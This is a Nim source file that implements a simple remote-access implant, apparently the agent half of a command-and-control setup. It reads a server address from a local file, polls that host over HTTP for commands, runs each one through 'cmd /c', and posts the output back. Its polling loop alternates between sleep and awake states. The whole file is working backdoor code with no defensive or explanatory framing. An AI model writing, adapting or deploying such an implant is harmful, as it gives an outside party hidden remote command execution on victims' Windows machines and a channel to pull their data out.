import osproc
import std/[httpclient, json]
import strutils
import os
import net
var state = "sleep"
var client = newHttpClient()
const id = 1
var sleepcheck = false
let ip = readFile("data.txt")
var sleepCommandCounter = 0

proc runCommand(command: string):string =
  let (output, _) = execCmdEx("cmd /c $1" % [$command])
  echo output
  return output

  

proc getCommand(): string =
  let id = 1
  try:
    let output: string = client.getContent("http://$1:8000/get/$2" % [$ip,$id])
    echo output
    return output
  except:
    echo "can't get command"
  finally:
    client.close()
  

proc sendOutput(input: string) =
  client.headers = newHttpHeaders({ "Content-Type": "application/json" })
  let body = %*{
      "command": "$1" % [$input],
      "id": "$1" % [$id]
  }
  try:
    let response = client.request("http://$1:8000/set" % [$ip], httpMethod = HttpPost, body = $body)
  except:
    echo "can't send command"

proc main() =
  while true:
    if state == "awake":
      if sleepcheck == true:
        state = "sleep"
      else:
        if getCommand() != "":
          sendOutput(runCommand(getCommand()))
          echo "Here"
          sleep(30000)
        else:
          sleepcheck = true
    if state == "sleep":
      for i in 0 .. 5:
        if sleepCommandCounter == 5:
          state = "awake"
        else:
          if getCommand() != "":
            sendOutput(runCommand(getCommand()))
            echo "Here"
            sleep(30000)
            sleepCommandCounter += 1
          else:
            sleepCommandCounter = 0
    if state == "sleep":
      echo "hi"
      
main()